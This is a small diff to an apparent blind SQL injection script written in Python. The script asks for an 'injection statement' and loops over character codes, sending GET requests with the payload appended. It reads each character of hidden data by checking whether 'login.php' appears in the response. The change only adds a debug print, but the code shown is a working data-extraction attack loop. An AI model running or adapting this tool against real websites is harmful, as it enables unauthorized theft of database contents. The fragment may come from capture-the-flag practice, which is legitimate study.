@@ -11,6 +11,7 @@ data=input("输入注入语句")
 def fun(url,result,result2):
     # 
         for i in range(result2):
+            print(i)
             reponse=requests.get(url+data.format(result,i),timeout=1)
             if 'login.php' in reponse.text:
                 print(result,chr(i)+"\n")
